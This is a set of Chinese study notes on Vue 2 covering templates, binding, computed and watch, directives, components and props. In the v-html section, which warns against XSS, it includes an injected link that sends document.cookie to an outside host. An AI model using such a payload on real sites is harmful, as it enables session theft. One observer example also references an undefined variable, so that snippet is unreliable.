# Vue2
## 初识Vue
   1. 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
   2. root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；
   3. root容器里的代码被称为【Vue模板】；
   4. Vue实例和容器是一一对应的；
   5. 真实开发中只有一个Vue实例，并且会配合着组件一起使用；
   6. {{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；
   7. 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；
   8. 注意区分：js表达式 和 js代码(语句)
      1. 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
         1. a
         2. a+b
         3. demo(1)
         4. x === y ? 'a' : 'b'

      2. js代码(语句)
         1. if(){}
         2. for(){}

## 模板语法
   1. 插值语法：
      - 功能：用于解析标签体内容。
      - 写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。
   2. 指令语法：
      - 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
      - 举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，
               且可以直接读取到data中的所有属性。
      - 备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。

## 数据绑定
   1. 单向绑定(v-bind)：数据只能从data流向页面。
      ```html
      <!-- 普通写法 -->
      <input type="text" v-bind:value="name">
      <!-- 简写 -->
      <input type="text" :value="name">
      ```
   2. 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
      1. 双向绑定一般都应用在表单类元素上（如：input、select等）
      2. v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。
         ```html
         <input type="text" v-model="name">
         ```

## data与el的写法
   1. el有2种写法
      1. new Vue时候配置el属性。
      2. 先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
   2. data有2种写法
      1. 对象式
      2. 函数式
      3. 如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
   3. 一个重要的原则：
      由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了

## MVVM模型
   1. M：模型(Model) ：data中的数据
   2. V：视图(View) ：模板代码
   3. VM：视图模型(ViewModel)：Vue实例
   4. 观察发现
      1. data中所有的属性，最后都出现在了vm身上。
		2. vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。

## 数据代理
   1. 定义：通过一个对象代理对另一个对象中属性的操作（读/写）
   2. 原生JS中的数据代理

      ```html
      <script type="text/javascript" >
			let number = 18
			let person = {
				name:'张三',
				sex:'男',
			}

			Object.defineProperty(person,'age',{
				// value:18,
				// enumerable:true, //控制属性是否可以枚举，默认值是false
				// writable:true, //控制属性是否可以被修改，默认值是false
				// configurable:true //控制属性是否可以被删除，默认值是false

				//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
				get(){
					console.log('有人读取age属性了')
					return number
				},

				//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
				set(value){
					console.log('有人修改了age属性，且值是',value)
					number = value
				}

			})

			// console.log(Object.keys(person))

			console.log(person)
		</script>
      ```
   3. Vue中的数据代理
      1. 通过vm对象来代理data对象中属性的操作（读/写）
      2. Vue中数据代理的好处： 更加方便的操作data中的数据
      3. 基本原理：
         1. 通过Object.defineProperty()把data对象中所有属性添加到vm上。
         2. 为每一个添加到vm上的属性，都指定一个getter/setter。
         3. 在getter/setter内部去操作（读/写）data中对应的属性。
         
## 事件处理
   1. 使 用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
   2. 事件的回调需要配置在methods对象中，最终会在vm上；
   3. methods中配置的函数，不要用箭头函数！否则this就不是vm了；
   4. methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
   5. @click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；

      ```html
      <body>
         <!-- 准备好一个容器-->
         <div id="root">
            <h2>欢迎来到{{name}}学习</h2>
            <!-- <button v-on:click="showInfo">点我提示信息</button> -->
            <button @click="showInfo1">点我提示信息1（不传参）</button>
            <button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
         </div>
      </body>

      <script type="text/javascript">
         Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

         const vm = new Vue({
            el:'#root',
            data:{
               name:'测试',
            },
            methods:{
               showInfo1(event){
                  // console.log(event.target.innerText)
                  // console.log(this) //此处的this是vm
                  alert('同学你好！')
               },
               showInfo2(event,number){
                  console.log(event,number)
                  // console.log(event.target.innerText)
                  // console.log(this) //此处的this是vm
                  alert('同学你好！！')
               }
            }
         })
      </script>
      ```
   6. 事件修饰符
      1. prevent：阻止默认事件（常用）；
      2. stop：阻止事件冒泡（常用）；
      3. once：事件只触发一次（常用）；
      4. capture：使用事件的捕获模式；
      5. self：只有event.target是当前操作的元素时才触发事件；
      6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
   7. 键盘时间
      1. Vue中常用的按键别名：
         - 回车 => enter
         - 删除 => delete (捕获“删除”和“退格”键)
         - 退出 => esc
         - 空格 => space
         - 换行 => tab (特殊，必须配合keydown去使用)
         - 上 => up
         - 下 => down
         - 左 => left
         - 右 => right
      2. Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
      3. 系统修饰键（用法特殊）：ctrl、alt、shift、meta
         1. 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
         2. 配合keydown使用：正常触发事件。
      4. 也可以使用keyCode去指定具体的按键（不推荐）
      5. Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名

         ```html
         <body>
            <div id="root">
               <h2>欢迎来到{{name}}学习</h2>
               <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
            </div>
         </body>

         <script type="text/javascript">
            Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
            Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

            new Vue({
               el:'#root',
               data:{
                  name:'测试'
               },
               methods: {
                  showInfo(e){
                     // console.log(e.key,e.keyCode)
                     console.log(e.target.value)
                  }
               },
            })
         </script>
         ```
## 计算属性 computed
   1. 定义：要用的属性不存在，要通过已有属性计算得来。
   2. 原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
   3. get函数什么时候执行？
      1. 初次读取时会执行一次。
      2. 当依赖的数据发生改变时会被再次调用。
   4. 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
   5. 备注：
      1. 计算属性最终会出现在vm上，直接读取使用即可。
      2. 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
   
      ```html
      <body>
         <div id="root">
            姓：<input type="text" v-model="firstName"> <br/><br/>
            名：<input type="text" v-model="lastName"> <br/><br/>
            测试：<input type="text" v-model="x"> <br/><br/>
            全名：<span>{{fullName}}</span> <br/><br/>
            <!-- 全名：<span>{{fullName}}</span> <br/><br/>
            全名：<span>{{fullName}}</span> <br/><br/>
            全名：<span>{{fullName}}</span> -->
         </div>
      </body>

      <script type="text/javascript">
         Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

         const vm = new Vue({
            el:'#root',
            data:{
               firstName:'张',
               lastName:'三',
               x:'你好'
            },
            methods: {
               demo(){
                  
               }
            },
            computed:{
               fullName:{
                  //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
                  //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
                  get(){
                     console.log('get被调用了')
                     // console.log(this) //此处的this是vm
                     return this.firstName + '-' + this.lastName
                  },
                  //set什么时候调用? 当fullName被修改时。
                  set(value){
                     console.log('set',value)
                     const arr = value.split('-')
                     this.firstName = arr[0]
                     this.lastName = arr[1]
                  }
               }
            }
         })
      </script>
      ```

## 监视属性 watch
   1. 当被监视的属性变化时, 回调函数自动调用, 进行相关操作
   2. 监视的属性必须存在，才能进行监视！！
   3. 监视的两种写法：
      1. new Vue时传入watch配置
      2. 通过vm.$watch监视
   4. 深度监视：
      1. Vue中的watch默认不监测对象内部值的改变（一层）。
      2. 配置deep:true可以监测对象内部值改变（多层）。
      3. Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
      4. 使用watch时根据数据的具体结构，决定是否采用深度监视。
   5. computed和watch之间的区别：
      1. computed能完成的功能，watch都可以完成。
      2. watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。
   6. 两个重要的小原则
      1. 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
      2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。
      ```html
      <body>
         <!-- 准备好一个容器-->
         <div id="root">
            <h2>今天天气很{{info}}</h2>
            <button @click="changeWeather">切换天气</button>
         </div>
      </body>

      <script type="text/javascript">
         Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
         
         const vm = new Vue({
            el:'#root',
            data:{
               isHot:true,
            },
            computed:{
               info(){
                  return this.isHot ? '炎热' : '凉爽'
               }
            },
            methods: {
               changeWeather(){
                  this.isHot = !this.isHot
               }
            },
            watch:{
               //正常写法
               /* isHot:{
                  // immediate:true, //初始化时让handler调用一下
                  // deep:true,//深度监视
                  handler(newValue,oldValue){
                     console.log('isHot被修改了',newValue,oldValue)
                  }
               }, */
               //简写
               /* isHot(newValue,oldValue){
                  console.log('isHot被修改了',newValue,oldValue,this)
               } */
            }
         })

         //正常写法
         /* vm.$watch('isHot',{
            immediate:true, //初始化时让handler调用一下
            deep:true,//深度监视
            handler(newValue,oldValue){
               console.log('isHot被修改了',newValue,oldValue)
            }
         }) */

         //简写
         /* vm.$watch('isHot',(newValue,oldValue)=>{
            console.log('isHot被修改了',newValue,oldValue,this)
         }) */

      </script>
      ```

## 绑定样式
   1. class样式
      - 写法:class="xxx" xxx可以是字符串、对象、数组。
         1. 字符串写法适用于：类名不确定，要动态获取。
         2. 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
         3. 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
   2. style样式
         1. :style="{fontSize: xxx}"其中xxx是动态值。
         2. style="[a,b]"其中a、b是样式对象。
      ```html
      <body>
         <div id="root">
            <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
            <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

            <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
            <div class="basic" :class="classArr">{{name}}</div> <br/><br/>

            <!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
            <div class="basic" :class="classObj">{{name}}</div> <br/><br/>

            <!-- 绑定style样式--对象写法 -->
            <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
            <!-- 绑定style样式--数组写法 -->
            <div class="basic" :style="styleArr">{{name}}</div>
         </div>
      </body>

      <script type="text/javascript">
         Vue.config.productionTip = false
         
         const vm = new Vue({
            el:'#root',
            data:{
               name:'测试',
               mood:'normal',
               classArr:['ceshi1','ceshi2','ceshi3'],
               classObj:{
                  ceshi1:false,
                  ceshi2:false,
               },
               styleObj:{
                  fontSize: '40px',
                  color:'red',
               },
               styleObj2:{
                  backgroundColor:'orange'
               },
               styleArr:[
                  {
                     fontSize: '40px',
                     color:'blue',
                  },
                  {
                     backgroundColor:'gray'
                  }
               ]
            },
            methods: {
               changeMood(){
                  const arr = ['happy','sad','normal']
                  const index = Math.floor(Math.random()*3)
                  this.mood = arr[index]
               }
            },
         })
      </script>
      ```  
## 条件渲染
   1. v-if
      1. 写法：
         1. v-if="表达式" 
         2. v-else-if="表达式"
         3. v-else="表达式"
      2. 适用于：切换频率较低的场景。
      3. 特点：不展示的DOM元素直接被移除。
      4. 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。

   2. v-show
         1. 写法：v-show="表达式"
         2. 适用于：切换频率较高的场景。
         3. 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
      
   3. 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

      ```html
      <div id="root">
         <h2>当前的n值是:{{n}}</h2>
         <button @click="n++">点我n+1</button>
         <!-- 使用v-show做条件渲染 -->
         <!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
         <!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

         <!-- 使用v-if做条件渲染 -->
         <!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
         <!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

         <!-- v-else和v-else-if -->
         <!-- <div v-if="n === 1">Angular</div>
         <div v-else-if="n === 2">React</div>
         <div v-else-if="n === 3">Vue</div>
         <div v-else>哈哈</div> -->

         <!-- v-if与template的配合使用 -->
         <template v-if="n === 1">
            <h2>你好</h2>
            <h2>尚硅谷</h2>
            <h2>北京</h2>
         </template>

		</div>
      ``` 

## 列表渲染
   1. v-for指令:
      1. 用于展示列表数据
      2. 语法：v-for="(item, index) in xxx" :key="yyy"
      3. 可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
   2. <strong style="color:red">key的原理（面试点）</strong>
      1. 虚拟DOM中key的作用：
         key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
         随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
                  
      2. 对比规则：
         1. 旧虚拟DOM中找到了与新虚拟DOM相同的key：
            1. 若虚拟DOM中内容没变, 直接使用之前的真实DOM！
            2. 若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
         2. 旧虚拟DOM中未找到与新虚拟DOM相同的key
                  创建新的真实DOM，随后渲染到到页面。
                        
      3. 用index作为key可能会引发的问题：
         1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
               会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
         2. 如果结构中还包含输入类的DOM：
               会产生错误DOM更新 ==> 界面有问题。

      4. 开发中如何选择key?:
         1. 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
         2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
            使用index作为key是没有问题的。
   3. 数据监测
      1. vue会监视data中所有层次的数据。
      2. 如何监测对象中的数据？
         - 通过setter实现监视，且要在new Vue时就传入要监测的数据。
            1. 对象中后追加的属性，Vue默认不做响应式处理
            2. 如需给后添加的属性做响应式，请使用如下API：
               1. Vue.set(target，propertyName/index，value)
               2. vm.$set(target，propertyName/index，value)

      3. 如何监测数组中的数据？
         - 通过包裹数组更新元素的方法实现，本质就是做了两件事：
            1. 调用原生对应的方法对数组进行更新。
            2. 重新解析模板，进而更新页面。

      4. 在Vue修改数组中的某个元素一定要用如下方法：
         1. 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
         2. Vue.set() 或 vm.$set()
            ```html
            <body>
               <div id="root">
                  <h1>学生信息</h1>
                  <button @click="student.age++">年龄+1岁</button> <br/>
                  <button @click="addSex">添加性别属性，默认值：男</button> <br/>
                  <button @click="student.sex = '未知' ">修改性别</button> <br/>
                  <button @click="addFriend">在列表首位添加一个朋友</button> <br/>
                  <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br/>
                  <button @click="addHobby">添加一个爱好</button> <br/>
                  <button @click="updateHobby">修改第一个爱好为：开车</button> <br/>
                  <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br/>
                  <h3>姓名：{{student.name}}</h3>
                  <h3>年龄：{{student.age}}</h3>
                  <h3 v-if="student.sex">性别：{{student.sex}}</h3>
                  <h3>爱好：</h3>
                  <ul>
                     <li v-for="(h,index) in student.hobby" :key="index">
                        {{h}}
                     </li>
                  </ul>
                  <h3>朋友们：</h3>
                  <ul>
                     <li v-for="(f,index) in student.friends" :key="index">
                        {{f.name}}--{{f.age}}
                     </li>
                  </ul>
               </div>
            </body>

            <script type="text/javascript">
               Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

               const vm = new Vue({
                  el:'#root',
                  data:{
                     student:{
                        name:'tom',
                        age:18,
                        hobby:['抽烟','喝酒','烫头'],
                        friends:[
                           {name:'jerry',age:35},
                           {name:'tony',age:36}
                        ]
                     }
                  },
                  methods: {
                     addSex(){
                        // Vue.set(this.student,'sex','男')
                        this.$set(this.student,'sex','男')
                     },
                     addFriend(){
                        this.student.friends.unshift({name:'jack',age:70})
                     },
                     updateFirstFriendName(){
                        this.student.friends[0].name = '张三'
                     },
                     addHobby(){
                        this.student.hobby.push('学习')
                     },
                     updateHobby(){
                        // this.student.hobby.splice(0,1,'开车')
                        // Vue.set(this.student.hobby,0,'开车')
                        this.$set(this.student.hobby,0,'开车')
                     },
                     removeSmoke(){
                        this.student.hobby = this.student.hobby.filter((h)=>{
                           return h !== '抽烟'
                        })
                     }
                  }
               })
            </script>
            ```
      5. 特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！

      6. 模拟数据监测
         ```html
         <script type="text/javascript">
            let data = {
                  name: '132',
                  address: '456',
            }

            //创建一个监视的实例对象，用于监视data中属性的变化
            const obs = new Observer(data)
            console.log(obs)
            //准备一个vm实例对象
            let vm = {}
            vm._data = data = ob
            function Observer(obj){
               //汇总对象中所有的属性形成一个数组
               const keys = Object.keys(obj)
               //遍历
               keys.forEach((k)=>{
                  // 注意此时的this指的是Observer实例
                  Object.defineProperty(this,k,{
                     get(){
                        return obj[k]
                     },
                     set(val){
                        console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
                        obj[k] = val
                     }
                  })
               })
            }
         </script>
         ```   

## 收集表单数据
   1. 若：`<input type="text"/>`，则v-model收集的是value值，用户输入的就是value值。
   2. 若：`<input type="radio"/>`，则v-model收集的是value值，且要给标签配置value值。
   3. 若：`<input type="checkbox"/>`
         1. 没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
         2. 配置input的value属性:
            1. v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
            2. v-model的初始值是数组，那么收集的的就是value组成的数组
   4. 备注：v-model的三个修饰符：
         1. lazy：失去焦点再收集数据
         2. number：输入字符串转为有效的数字
         3. trim：输入首尾空格过滤 (若还需中间空格过滤，自行使用js过滤)

## 过滤器
   1. 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
   2. 语法：
      1. 注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
      2. 使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
   3. 备注：
      1. 过滤器也可以接收额外参数、多个过滤器也可以串联
      2. 并没有改变原本的数据, 是产生新的对应的数据

      ```html
      <body>
         <div id="root">
            <h2>显示格式化后的时间</h2>
            <!-- 计算属性实现 -->
            <h3>现在是：{{fmtTime}}</h3>
            <!-- methods实现 -->
            <h3>现在是：{{getFmtTime()}}</h3>
            <!-- 过滤器实现 -->
            <h3>现在是：{{time | timeFormater}}</h3>
            <!-- 过滤器实现（传参） -->
            <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
            <h3 :x="msg | mySlice">132132456</h3>
         </div>

         <div id="root2">
            <h2>{{msg | mySlice}}</h2>
         </div>
      </body>

      <script type="text/javascript">
         Vue.config.productionTip = false
         //全局过滤器
         Vue.filter('mySlice',function(value){
            return value.slice(0,4)
         })
         
         new Vue({
            el:'#root',
            data:{
               time:1621561377603, //时间戳
               msg:'你好，世界'
            },
            computed: {
               fmtTime(){
                  // dayjs是引入的js日期库
                  return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
               }
            },
            methods: {
               getFmtTime(){
                  return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
               }
            },
            //局部过滤器
            filters:{
               timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
                  // console.log('@',value)
                  return dayjs(value).format(str)
               }
            }
         })

         new Vue({
            el:'#root2',
            data:{
               msg:'hello,world!'
            }
         })
      </script>
      ```

## 内置指令
   1. v-text指令：
      1. 作用：向其所在的节点中渲染文本内容。
      2. 与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

         ```html
         <body>
            <div id="root">
               <div>你好，{{name}}</div>
               <div v-text="name"></div>
               <div v-text="str"></div>
            </div>
         </body>

         <script type="text/javascript">
            Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
            
            new Vue({
               el:'#root',
               data:{
                  name:'世界',
                  str:'<h3>你好啊！</h3>'
               }
            })
         </script>
         ```
   2. v-html指令：
      1. 作用：向指定节点中渲染包含html结构的内容。
      2. 与插值语法的区别：
         1. v-html会替换掉节点中所有的内容，{{xx}}则不会。
         2. v-html可以识别html结构。
      3. 严重注意：v-html有安全性问题！！！！
         1. 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
         2. 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

         ```html
         <body>
            <div id="root">
               <div>你好，{{name}}</div>
               <div v-html="str"></div>
               <div v-html="str2"></div>
            </div>
         </body>

         <script type="text/javascript">
            Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

            new Vue({
               el:'#root',
               data:{
                  name:'世界',
                  str:'<h3>你好啊！</h3>',
                  str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
               }
            })
         </script>
         ```
   3. v-cloak指令（没有值）：
         1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
         2. 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

            ```html
            <body>
               <div id="root">
                  <h2 v-cloak>{{name}}</h2>
               </div>
               <!-- 这里引入的是5s才返回的vuejs -->
               <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
            </body>
            
            <script type="text/javascript">
               console.log(1)
               Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
               
               new Vue({
                  el:'#root',
                  data:{
                     name:'321321321'
                  }
               })
            </script>
            ```
   4. v-once指令：
      1. v-once所在节点在初次动态渲染后，就视为静态内容了。
      2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
         ```html
         <h2 v-once>初始化的n值是:{{n}}</h2>
         ```
   5. v-pre指令：
      1. 跳过其所在节点的编译过程。
      2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
         ```html
         <h2 v-pre>Vue其实很简单</h2>
         ```

## 自定义指令
   1. 定义语法：
      1. 局部指令：
         ```html
         new Vue({															
            directives:{指令名:配置对象}
         }) 
         new Vue({
            directives{指令名:回调函数}
         })	
         ```                                                   
      2. 全局指令：Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
                        

   2. 配置对象中常用的3个回调：
      1. bind：指令与元素成功绑定时调用。
      2. inserted：指令所在元素被插入页面时调用。
      3. update：指令所在模板结构被重新解析时调用。

   3. 备注：
      1. 指令定义时不加v-，但使用时要加v-；
      2. 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
      
      ```html
      <body>
         <div id="root">
            <h2>{{name}}</h2>
            <h2>当前的n值是：<span v-text="n"></span> </h2>
            <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
            <h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
            <button @click="n++">点我n+1</button>
            <hr/>
            <input type="text" v-fbind:value="n">
         </div>
      </body>
      
      <script type="text/javascript">
         Vue.config.productionTip = false

         //定义全局指令
         /* Vue.directive('fbind',{
            //指令与元素成功绑定时（一上来）
            bind(element,binding){
               element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted(element,binding){
               element.focus()
            },
            //指令所在的模板被重新解析时
            update(element,binding){
               element.value = binding.value
            }
         }) */

         new Vue({
            el:'#root',
            data:{
               name:'123132',
               n:1
            },
            directives:{
               //big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
               /* 'big-number'(element,binding){
                  // console.log('big')
                  element.innerText = binding.value * 10
               }, */
               big(element,binding){
                  console.log('big',this) //注意此处的this是window
                  // console.log('big')
                  element.innerText = binding.value * 10
               },
               fbind:{
                  //指令与元素成功绑定时（一上来）
                  bind(element,binding){
                     element.value = binding.value
                  },
                  //指令所在元素被插入页面时
                  inserted(element,binding){
                     element.focus()
                  },
                  //指令所在的模板被重新解析时
                  update(element,binding){
                     element.value = binding.value
                  }
               }
            }
         })
         
      </script>
      ```

## 生命周期
![Vue2 实例生命周期](https://z3.ax1x.com/2021/10/28/5LmkH1.png)
   1. 又名：生命周期回调函数、生命周期函数、生命周期钩子。
   2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
   3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
   4. 生命周期函数中的this指向是vm 或 组件实例对象。
   5. mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
   6. beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
   7. 销毁后借助Vue开发者工具看不到任何信息。
   8. 销毁后自定义事件会失效，但原生DOM事件依然有效。
   9. 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。

   ```html
   <script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			// template:`
			// 	<div>
			// 		<h2>当前的n值是：{{n}}</h2>
			// 		<button @click="add">点我n+1</button>
			// 	</div>
			// `,
			data:{
				n:1
			},
			methods: {
				add(){
					console.log('add')
					this.n++
				},
				bye(){
					console.log('bye')
					this.$destroy()
				}
			},
			watch:{
				n(){
					console.log('n变了')
				}
			},
			beforeCreate() {
				console.log('beforeCreate')
			},
			created() {
				console.log('created')
			},
			beforeMount() {
				console.log('beforeMount')
			},
			mounted() {
				console.log('mounted')
			},
			beforeUpdate() {
				console.log('beforeUpdate')
			},
			updated() {
				console.log('updated')
			},
			beforeDestroy() {
				console.log('beforeDestroy')
			},
			destroyed() {
				console.log('destroyed')
			},
		})
	</script>
   ```

## 组件
   1. Vue中使用组件的三大步骤：
      1. 定义组件(创建组件)
         - 使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
            1. el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
            2. data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
         - 备注：使用template可以配置组件结构。
      2. 注册组件
         1. 局部注册：靠new Vue的时候传入components选项
         2. 全局注册：靠Vue.component('组件名',组件)
      3. 使用组件(写组件标签) `<school></school>`
   2. 注意点
      1. 关于组件名:
         1. 一个单词组成：
            1. 第一种写法(首字母小写)：school
            2. 第二种写法(首字母大写)：School
         2. 多个单词组成：
            1. 第一种写法(kebab-case命名)：my-school
            2. 第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
         3. 备注：
            1. 组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
            2. 可以使用name配置项指定组件在开发者工具中呈现的名字。

      2. 关于组件标签:
         1. 第一种写法：<school></school>
         2. 第二种写法：<school/>
         3. 备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。

      3. 一个简写方式：
         const school = Vue.extend(options) 可简写为：const school = options  
   3. 关于VueComponent：
      1. school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

      2. 我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
         即Vue帮我们执行的：new VueComponent(options)。

      3. 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！

      4. 关于this指向：
         1. 组件配置中：
            data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
         2. new Vue(options)配置中：
            data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

      5. VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。 Vue的实例对象，以后简称vm。             

## 脚手架文件结构

	├── node_modules 
	├── public
	│   ├── favicon.ico: 页签图标
	│   └── index.html: 主页面
	├── src
	│   ├── assets: 存放静态资源
	│   │   └── logo.png
	│   │── component: 存放组件
	│   │   └── HelloWorld.vue
	│   │── App.vue: 汇总所有组件
	│   │── main.js: 入口文件
	├── .gitignore: git版本管制忽略的配置
	├── babel.config.js: babel的配置文件
	├── package.json: 应用包配置文件 
	├── README.md: 应用描述文件
	├── package-lock.json：包版本控制文件

## 关于不同版本的Vue

1. vue.js与vue.runtime.xxx.js的区别：
    1. vue.js是完整版的Vue，包含：核心功能 + 模板解析器。
    2. vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
2. 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容。

## vue.config.js配置文件

1. 使用vue inspect > output.js可以查看到Vue脚手架的默认配置。
2. 使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh

## ref属性

1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
3. 使用方式：
    1. 打标识：```<h1 ref="xxx">.....</h1>``` 或 ```<School ref="xxx"></School>```
    2. 获取：```this.$refs.xxx```

## props配置项

1. 功能：让组件接收外部传过来的数据

2. 传递数据：```<Demo name="xxx"/>```

3. 接收数据：

    1. 第一种方式（只接收）：```props:['name'] ```

    2. 第二种方式（限制类型）：```props:{name:String}```

    3. 第三种方式（限制类型、限制必要性、指定默认值）：

        ```js
        props:{
        	name:{
        	type:String, //类型
        	required:true, //必要性
        	default:'老王' //默认值
        	}
        }
        ```

